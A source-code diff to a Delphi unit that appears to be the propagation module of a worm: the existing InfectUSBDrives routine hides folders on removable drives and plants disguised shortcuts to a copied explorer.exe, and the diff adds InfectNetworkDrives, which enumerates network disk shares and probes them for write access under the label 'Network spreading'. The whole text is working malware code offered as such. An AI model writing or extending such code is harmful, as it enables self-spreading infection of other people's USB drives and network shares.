@@ -8,8 +8,12 @@ uses
   Windows, SysUtils, Classes, ShellApi, ShlObj, ComObj, ActiveX;
 
 procedure InfectUSBDrives;
+procedure InfectNetworkDrives;
 
 implementation
+
+var
+  AlreadyTried: TStringList;
 
 const
   DeskAttr = faHidden{%H-} or faSysFile{%H-} or faReadOnly;
@@ -21,6 +25,7 @@ var
   SLink: IShellLink;
   PFile: IPersistFile;
 begin
+  CoInitialize(Nil);
   IObject:=CreateComObject(CLSID_ShellLink);
   SLink:=IObject as IShellLink;
   PFile:=IObject as IPersistFile;
@@ -32,6 +37,7 @@ begin
     SetIconLocation('C:\Windows\system32\SHELL32.dll', 7);
   end;
   PFile.Save(PWChar(WideString(PathLink)), FALSE);
+  CoUninitialize;
 end;
 
 function GetVolumeLabel(DriveChar: Char): string;
@@ -95,13 +101,78 @@ Begin
               FileSetAttr(D+'\explorer.exe', SysAttr);
               FileSetAttr(D, SysAttr);
               //Create shortcut
-              CreateLink(D+'\explorer.exe', I+':\'+Lbl+'.lnk', 'Files and Documents', '/open "'+D+'"');
+              CreateLink(D+'\explorer.exe', I+':\'+Lbl+' ('+I+').lnk', 'Files and Documents', '/open "'+D+'"');
             end;
           end;
           Sleep(2000);
         end;
       dMask:=dMask shl 1;
     end;
+end;
+
+procedure EnumNetworkResources(NetResource: PNEtResource; List: TStrings);
+var
+ Count, BufSize, I: Cardinal;
+ EnumHandle: LongWord;
+ NetArray: array[0..250] of TNetResource;
+begin
+ if WNetOpenEnum(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, 0, NetResource,EnumHandle) = NO_ERROR then
+  try
+   Count := $FFFFFFFF;
+   BufSize := SizeOf(NetArray);
+   if WNetEnumResource(EnumHandle, Count, @NetArray, BufSize) = NO_ERROR then
+    begin
+     for i := 0 to Count -1 do
+      begin
+       if NetArray[i].dwType=RESOURCETYPE_DISK Then List.Add(NetArray[i].lpRemoteName);
+       EnumNetworkResources(@NetArray[i], List);
+      end;
+    end;
+  finally
+   WNetCloseEnum(EnumHandle);
+  end;
+end;
+
+function WriteAccess(Path: String): Boolean;
+var
+  FFile: Text;
+  TempFile: PChar;
+  Unique: Word;
+Begin
+  Unique:=Random(High(Word));
+  Result:=(GetTempFileName(PChar(Path), 'wchk', Unique, TempFile)=Unique);
+  if Result then Begin
+    try
+      AssignFile(FFile, TempFile);
+      Rewrite(FFile);
+      CloseFile(FFile);
+    except
+      Result:=False;
+    end;
+  end;
+end;
+
+procedure InfectNetworkDrives;
+var
+  AList: TStringList;
+  J: LongInt;
+Begin
+  Writeln('Network spreading started.');
+  AList:=TStringList.Create;
+  if Not(Assigned(AlreadyTried)) then
+    AlreadyTried:=TStringList.Create;
+  EnumNetworkResources(Nil, AList);
+  Writeln('Enumeration complete.');
+  For J:=0 to AList.Count - 1 do
+  if AlreadyTried.IndexOf(AList.Strings[J])=-1 then Begin
+    if WriteAccess(AList.Strings[J]) then Begin
+      Write('YES: ');
+    end else Write('NO: ');
+    Writeln(AList.Strings[J]);
+    AlreadyTried.Add(AList.Strings[J]);
+  end;
+  AList.Free;
+  Writeln('Network spreding stopped.');
 end;
 
 end.
